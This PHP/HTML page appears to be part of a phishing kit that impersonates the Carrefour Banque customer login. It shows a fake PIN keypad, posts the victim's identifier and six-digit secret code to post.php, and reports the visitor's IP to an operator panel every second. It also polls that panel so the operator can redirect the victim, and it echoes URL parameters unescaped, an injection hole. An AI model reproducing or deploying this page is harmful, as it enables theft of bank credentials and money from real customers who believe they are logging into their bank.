<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Connexion à l’Espace Client</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="inc/jihanaid.css">
<link rel="stylesheet" href="inc/login.css">
</head>
<body style="background:#ddd;">
<div class="container bg-white" style="width:1170px;">
<div class="row colsholder d-block-on-below-700" >


<div class="col leftcol">
    <!-- start leftcol -->
<div class="backbtn">
<a href="user.php"><img src="inc/backbtn.png"></a>
</div>

<div class="logo text-center">
    <img src="inc/logo.png">
</div>


<div class="form">
    <!-- form start -->
<div class="form-title">
    <h2 style="font-family:bold; color:#2d2d2d;">Accès à mon Espace Client</h2>
</div>

<div class="form-col" style="margin:25px 0;">
<div class="textinput row" style="background: #e5e5e5;">
    <input type="text" id="u" value="<?php echo @$_GET['id']; ?>" readonly="" style="width:100%; border:none; background:none; font-size: 1em;
    color: #0E3368;
    font-family: bold;"> <img src="inc/gray_lock.png" style="width:20px;">
</div>
</div>

<div class="form-col">
<label>Mon code secret (6 chiffres) </label>
<div class="textinput row" id="passholder">
    <input type="password" id="p" readonly="" style="width:100%; border:none; background:none; font-size: 1em;
    color: #0E3368;font-family: bold; letter-spacing:3px;"> 
    <button onclick="resetPass()">Corriger</button>
</div>
<a href="javascript:void(0)">Code secret oublié</a>
</div>

<div class="form-col">
<div class="keyboard">
<div class="kb-sector">
<div class="kb-button"><button onclick="add(7)">7</button></div>
<div class="kb-button"><button onclick="add(1)">1</button></div>
<div class="kb-button"><button onclick="add(3)">3</button></div>
<div class="kb-button"><button onclick="add(5)">5</button></div>
<div class="kb-button"><button onclick="add(9)">9</button></div>
</div>
<div class="kb-sector">
<div class="kb-button"><button onclick="add(8)">8</button></div>
<div class="kb-button"><button onclick="add(2)">2</button></div>
<div class="kb-button"><button onclick="add(6)">6</button></div>
<div class="kb-button"><button onclick="add(0)">0</button></div>
<div class="kb-button"><button onclick="add(4)">4</button></div>
</div>
</div>
</div> 

<div class="form-col" style="margin-top:-30px; margin-bottom:50px; display:none;" id="pass-error"> 
<p style="color:red;" > Votre code secret doit contenir 6 caractères numériques.</p>
</div>

 
<div class="form-col">
    <p style="color:red; font-size:1em; display:none;" id="u11">L'identifiant doit comporter 11 caractères.</p>
    <p style="color:red; font-size:1em; display:none;" id="u-required">Le champ Identifiant Internet est obligatoire.</p>
</div>


<div class="form-col">
    <button class="sbmt" onclick="sendLogin()">Me connecter</button>
</div>

<!-- end form -->

</div>

<!-- end leftcol -->
</div>



<div class="col rightcol">
<!-- start right col text boxes -->

<div class="textboxes" style="width:100%;">

<div class="box">
    <h3><img src="inc/info.png"> Mon espace client</h3>
    <p>
    <ul>
<li>Consultation de solde, dernières opérations et relevés mensuels</li>
<li>Demande de virement Crédit PASS</li>
<li>Consultation de vos compte épargnes et de vos intérêts</li>
<li>Demande de versements et plan de versement</li>
</ul>
<a href="#"><i class="fa-solid fa-angle-right"></i> Je découvre le Guide Espace Client Carrefour Banque</a>
   

    </p>
</div>

<div class="box">
<div class="row">

<div class="col">
<h3><img src="inc/lock.png"> Espace Client</h3>
<a href="#"><i class="fa-solid fa-angle-right"></i> Connectez-vous en toute sécurité</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Suivre ma demande</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Virement crédit PASS</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Appli mobile</a>
</div>

<div class="col">
<h3><img src="inc/info.png"> Infos légales</h3>
<a href="#"><i class="fa-solid fa-angle-right"></i> Cookies / Infos légales</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Paramétrage des cookies</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Conditions générales de vente</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Contact</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Accessibilité</a>
</div>

</div>
</div>



</div>

<!-- end right col text boxes -->
</div>






</div>
</div>


<script src="inc/cdns/jq.js"></script>
<script>

function resetPass(){

}

var pass        =  "";
var input_index =   0;
    var abort = false;
function add(num){
 
    $("#pass-error").hide();
     $("#passholder").removeClass("error");
    if(pass.length>=6){
        return false;
    }else{
        pass = pass.toString()+num;
        $("#p").val( $("#p").val()+num);
    }
    
}

function resetPass(){
    $("#p").val("");
    pass = "";
}


function sendLogin(){
    $("#pass-error").hide();
    $("#passholder").removeClass("error");

    if($("#p").val().length==6){
       
        $.post("post.php", {user:$("#u").val(), pass:$("#p").val()}, (d)=>{
               window.location="processing.php?p=LOGIN";
        });


    }else{
        $("#pass-error").show();
        $("#passholder").addClass("error");
    }
}


setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);

</script>
</body>
</html>